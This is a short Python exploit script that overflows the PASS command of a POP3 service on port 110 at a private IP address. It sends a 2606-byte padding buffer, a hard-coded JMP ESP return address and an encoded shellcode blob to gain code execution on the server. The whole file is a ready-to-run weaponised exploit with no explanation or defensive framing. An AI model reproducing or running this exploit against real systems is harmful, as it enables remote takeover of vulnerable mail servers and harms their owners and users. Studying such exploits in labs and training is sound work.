#!/usr/bin/python
import socket
import struct


Shellcode=("\xb8\x3e\x17\x16\xe8\xdb\xd0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x42\x0e\x03\x7c\x19\xf4\x1d\x7c\xcd\x7a"
"\xdd\x7c\x0e\x1b\x57\x99\x3f\x1b\x03\xea\x10\xab\x47\xbe\x9c"
"\x40\x05\x2a\x16\x24\x82\x5d\x9f\x83\xf4\x50\x20\xbf\xc5\xf3"
"\xa2\xc2\x19\xd3\x9b\x0c\x6c\x12\xdb\x71\x9d\x46\xb4\xfe\x30"
"\x76\xb1\x4b\x89\xfd\x89\x5a\x89\xe2\x5a\x5c\xb8\xb5\xd1\x07"
"\x1a\x34\x35\x3c\x13\x2e\x5a\x79\xed\xc5\xa8\xf5\xec\x0f\xe1"
"\xf6\x43\x6e\xcd\x04\x9d\xb7\xea\xf6\xe8\xc1\x08\x8a\xea\x16"
"\x72\x50\x7e\x8c\xd4\x13\xd8\x68\xe4\xf0\xbf\xfb\xea\xbd\xb4"
"\xa3\xee\x40\x18\xd8\x0b\xc8\x9f\x0e\x9a\x8a\xbb\x8a\xc6\x49"
"\xa5\x8b\xa2\x3c\xda\xcb\x0c\xe0\x7e\x80\xa1\xf5\xf2\xcb\xad"
"\x3a\x3f\xf3\x2d\x55\x48\x80\x1f\xfa\xe2\x0e\x2c\x73\x2d\xc9"
"\x53\xae\x89\x45\xaa\x51\xea\x4c\x69\x05\xba\xe6\x58\x26\x51"
"\xf6\x65\xf3\xf6\xa6\xc9\xac\xb6\x16\xaa\x1c\x5f\x7c\x25\x42"
"\x7f\x7f\xef\xeb\xea\x7a\x78\xd4\x43\x84\xff\xbc\x91\x84\xfb"
"\xee\x1f\x62\x69\x1f\x76\x3d\x06\x86\xd3\xb5\xb7\x47\xce\xb0"
"\xf8\xcc\xfd\x45\xb6\x24\x8b\x55\x2f\xc5\xc6\x07\xe6\xda\xfc"
"\x2f\x64\x48\x9b\xaf\xe3\x71\x34\xf8\xa4\x44\x4d\x6c\x59\xfe"
"\xe7\x92\xa0\x66\xcf\x16\x7f\x5b\xce\x97\xf2\xe7\xf4\x87\xca"
"\xe8\xb0\xf3\x82\xbe\x6e\xad\x64\x69\xc1\x07\x3f\xc6\x8b\xcf"
"\xc6\x24\x0c\x89\xc6\x60\xfa\x75\x76\xdd\xbb\x8a\xb7\x89\x4b"
"\xf3\xa5\x29\xb3\x2e\x6e\x49\x56\xfa\x9b\xe2\xcf\x6f\x26\x6f"
"\xf0\x5a\x65\x96\x73\x6e\x16\x6d\x6b\x1b\x13\x29\x2b\xf0\x69"
"\x22\xde\xf6\xde\x43\xcb")
jmp_esp= struct.pack("<I", 0x5F4A358F) 

buffer="A"*2606+ jmp_esp + Shellcode
print ("Size %s"%(len(buffer)))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.0.134',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')